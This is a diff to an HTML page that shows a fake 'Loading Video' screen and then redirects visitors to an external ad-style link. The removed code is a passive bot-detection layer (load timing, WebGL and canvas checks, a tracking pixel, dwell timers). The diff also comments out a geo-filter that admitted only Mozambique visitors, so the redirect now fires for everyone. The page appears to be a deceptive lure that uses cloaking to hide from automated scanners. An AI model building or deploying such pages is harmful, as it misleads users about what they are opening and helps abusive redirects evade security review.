@@ -114,7 +114,7 @@
       <div id="content-modal">
         <h2 id="ellipsis">Loading Video</h2>
 
-        <img id="img-placeholder" src="filter1_image.jpeg" />
+        <!-- <img id="img-placeholder" src="filter1_image.jpeg" /> -->
 
         <div id="progress-container">
           <div id="progress-bar"></div>
@@ -131,71 +131,26 @@
 
     <script>
       /* ---------------------------------------------------
-   PASSIVE BOT DETECTION LAYER
-----------------------------------------------------*/
-      let botScore = 0;
-
-      /* 1. Load-time test */
-      const startTime = performance.now();
-      window.addEventListener("load", () => {
-        const loadTime = performance.now() - startTime;
-        if (loadTime < 150) botScore++;
-      });
-
-      /* 2. WebGL check */
-      try {
-        const gl = document.createElement("canvas").getContext("webgl");
-        if (!gl) botScore++;
-      } catch (e) {
-        botScore++;
-      }
-
-      /* 3. OffscreenCanvas test */
-      try {
-        new OffscreenCanvas(1, 1).getContext("2d");
-      } catch (e) {
-        botScore++;
-      }
-
-      /* 4. Hidden pixel load test */
-      let pixelLoaded = false;
-      document.getElementById("tracker").addEventListener("load", () => {
-        pixelLoaded = true;
-      });
-
-      /* 5. JS execution depth test */
-      let depthOK = false;
-      setTimeout(() => {
-        setTimeout(() => {
-          depthOK = true;
-        }, 20);
-      }, 20);
-
-      /* 6. Passive dwell requirement */
-      let stayedLongEnough = false;
-      setTimeout(() => (stayedLongEnough = true), 800);
-
-      /* ---------------------------------------------------
    GEO + LOADER + FINAL DECISION
 ----------------------------------------------------*/
-      const allowedCountries = ["MZ"];
+      // const allowedCountries = ["MZ"];
 
-      let userAllowedRegion = false; // store result
+      // let userAllowedRegion = false; // store result
 
-      async function checkGeo() {
-        try {
-          const res = await fetch("https://ipapi.co/json/");
-          const data = await res.json();
-          const userCountry = data.country?.toUpperCase() ?? null;
+      // async function checkGeo() {
+      //   try {
+      //     const res = await fetch("https://ipapi.co/json/");
+      //     const data = await res.json();
+      //     const userCountry = data.country?.toUpperCase() ?? null;
 
-          userAllowedRegion = allowedCountries.includes(userCountry);
-        } catch (err) {
+      //     userAllowedRegion = allowedCountries.includes(userCountry);
+      //   } catch (err) {
           // If geo lookup fails, default allow (or choose false)
-          userAllowedRegion = true;
-        }
+        //   userAllowedRegion = true;
+        // }
 
         startProgressBar();
-      }
+      // }
 
       function startProgressBar() {
         const bar = document.getElementById("progress-bar");
@@ -216,30 +171,21 @@
       }
 
       function finalize() {
-        /* PASSIVE BOT SCORE DECISION */
-        if (!pixelLoaded) botScore++;
-        if (!depthOK) botScore++;
-        if (!stayedLongEnough) botScore++;
-
-        if (botScore >= 2) {
-          document.querySelector(".page-shade").style.display = "none";
-          document.getElementById("bot-block").style.display = "block";
-          return;
-        }
 
         /* REGION BLOCK AFTER LOADER */
-        if (!userAllowedRegion) {
-          document.querySelector(".page-shade").style.display = "none";
-          document.getElementById("blocked-message").style.display = "block";
-          return;
-        }
+        // if (!userAllowedRegion) {
+        //   document.querySelector(".page-shade").style.display = "none";
+        //   document.getElementById("blocked-message").style.display = "block";
+        //   return;
+        // }
 
         /* Human + region allowed → redirect */
         window.location.href = "https://otieu.com/4/8203184";
       }
 
-      checkGeo();
+      // checkGeo();
     </script>
   </body>
 </html>
+
 
